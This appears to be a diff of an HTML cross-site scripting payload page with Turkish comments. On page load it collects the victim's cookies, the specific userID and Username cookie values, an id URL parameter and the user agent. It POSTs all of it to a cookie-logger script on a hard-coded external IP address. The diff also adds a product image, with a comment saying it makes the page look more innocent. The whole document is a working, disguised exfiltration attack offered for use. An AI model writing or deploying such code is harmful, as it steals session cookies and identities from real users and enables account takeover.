@@ -2,18 +2,37 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>XSS Demo</title>
+  <title>XSS: Exfiltrate Cookies & RandomID</title>
 </head>
 <body onload="(async () => {
+  // Cookie içinden belirli anahtar-değer yakalamak için basit yardımcı fonksiyon
+  function getCookieVal(name) {
+    // name=... kısmını yakalamak için bir regex
+    const match = document.cookie.match(new RegExp('(^|;\\s*)' + name + '=([^;]+)'));
+    return match ? match[2] : '';
+  }
+
+  // 1) Tüm cookie stringi
+  const cookieString = document.cookie;
+
+  // 2) Tek tek userID ve Username cookie değerlerini al
+  const userIDVal   = getCookieVal('userID');
+  const usernameVal = getCookieVal('Username');
+
+  // 3) URL parametresindeki ?id=... (örneğin /addresses?id=123) degerini yakala
+  const randomIDParam = new URLSearchParams(window.location.search).get('id');
+
   try {
+    // Bu verileri kendi sunucuna POST'la
     await fetch('http://16.171.42.24/cookie-logger.php', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      credentials: 'include', 
+      headers: { 'Content-Type': 'application/json' },
+      // credentials: 'include' => istersen ekle (auth cookie vs. göndersin)
       body: JSON.stringify({
-        victim_cookie: document.cookie,
+        cookie_string: cookieString,
+        userID_cookie: userIDVal,
+        username_cookie: usernameVal,
+        randomID_param: randomIDParam,
         user_agent: navigator.userAgent
       })
     });
@@ -22,11 +41,11 @@
   }
 })()">
 
-  <!-- İstenen görsel -->
+  <!-- Görsel ekleyerek sayfa daha masum görünebilir -->
   <img 
     src="https://akn-ss.a-cdn.akinoncloud.com/products/2021/09/15/314248/f8398d46-fc92-4498-8790-f3bbed8c57ff_size3840_cropCenter.jpg"
-    style="width:100%;"
-    alt="Görsel"
+    style="max-width:100%;"
+    alt="Resim"
   />
 
 </body>
